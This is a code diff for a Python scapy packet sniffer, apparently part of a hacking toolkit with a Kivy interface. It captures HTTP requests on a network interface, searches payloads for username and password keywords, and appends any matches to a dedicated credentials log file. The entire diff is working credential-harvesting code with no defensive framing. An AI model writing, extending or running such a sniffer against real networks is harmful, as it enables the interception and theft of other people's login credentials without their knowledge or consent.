@@ -5,37 +5,42 @@
 
 import scapy.all
 from scapy.layers.http import HTTPRequest
+from scapy.sendrecv import AsyncSniffer
 
 
 def get_url(packet):
-    return packet[HTTPRequest].Host + packet[HTTPRequest].Path
+    return (packet[HTTPRequest].Host + packet[HTTPRequest].Path).decode(errors="ignore")
 
 
 def get_login_info(packet):
     if packet.haslayer(scapy.all.Raw):
-        load = packet[scapy.all.Raw].load
+        load = packet[scapy.all.Raw].load.decode(errors="ignore")
         keywords = ["user", "usr", "name", "login", "mail",
                     "password", "pass", "pwd"]
-        if any(keyword in str(load).lower() for keyword in keywords):
+        if any(keyword in load.lower() for keyword in keywords):
             return load
 
 
-def print_info_frame(message_string, frame_symbol="−"):
-    length = len(message_string)
-    print("\n" + " INFO ".center(length, frame_symbol))
-    print(message_string)
-    print("".center(length, frame_symbol) + "\n")
+# TODO (optional): store in variable, send variable to main kivy loop.
+def write_log_entry(entry):
+    with open("data/sniffing_log.txt", "a") as log_file:
+        log_file.write(entry + "\n")
+
+
+def write_credentials_entry(entry):
+    with open("data/sniffing_credentials.txt", "a") as log_file:
+        log_file.write(entry + "\n")
 
 
 def process_sniffed_packet(packet):
     if packet.haslayer(HTTPRequest):
         url = get_url(packet)
-        print(f"[+] HTTP Request >> {url}")
+        write_log_entry(url)
         login_info = get_login_info(packet)
         if login_info:
-            print_info_frame(f"[+] Possible username/password >> {login_info}")
+            write_log_entry(login_info)
+            write_credentials_entry(login_info)
 
 
-def perform_sniffing(interface: str = "eth0") -> None:
-    print("Sniffing has been started.")
-    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+def create_sniffer(interface: str = "eth0") -> AsyncSniffer:
+    return AsyncSniffer(iface=interface, store=False, prn=process_sniffed_packet)
